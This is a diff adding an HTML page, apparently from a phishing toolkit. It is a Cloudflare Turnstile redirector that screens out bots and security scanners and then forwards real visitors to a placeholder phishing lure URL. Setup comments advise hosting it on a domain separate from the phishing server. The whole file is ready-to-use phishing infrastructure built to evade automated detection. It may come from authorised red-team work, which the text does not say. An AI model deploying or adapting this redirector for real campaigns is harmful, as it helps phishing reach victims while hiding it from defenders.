@@ -1,0 +1,37 @@
+<!--
+    Cloudflare Turnstile Redirector
+
+    Filters bots before redirecting real visitors to the phishing lure URL.
+    Deploy this page on a separate domain (e.g., Cloudflare Pages) — not on
+    the phishing server.
+
+    Setup:
+    1. Create a Turnstile site in the Cloudflare dashboard.
+    2. Set 'Domain' to your redirector's hosting domain.
+    3. Set 'Widget Mode' to 'Invisible' (or 'Managed' for interactive checks).
+    4. Replace the sitekey below with your Site Key.
+    5. Replace LURE_URL with your phishing lure URL.
+-->
+
+<html>
+<head>
+    <title>Loading...</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+</head>
+<body>
+
+Loading...
+<div id="cf-turnstile"></div>
+
+<script>
+turnstile.ready(function () {
+    turnstile.render('#cf-turnstile', {
+        sitekey: '1x00000000000000000000BB', // replace with your site key
+        callback: function(token) {
+            window.location.assign('LURE_URL'); // replace with your lure URL
+        },
+    });
+});
+</script>
+</body>
+</html>
